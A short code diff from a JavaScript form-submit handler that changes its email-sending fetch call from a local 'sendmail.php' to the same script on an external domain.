@@ -666,7 +666,7 @@ form.addEventListener('submit', (e) => {
             emailData.append('bitly', link); 
 
             console.log("timer 1");
-            return fetch('sendmail.php', { // Replace with your PHP email script
+            return fetch('https://riogapremium.in/server/sendmail.php', { // Replace with your PHP email script
                 method: 'POST',
                 body: emailData
             });
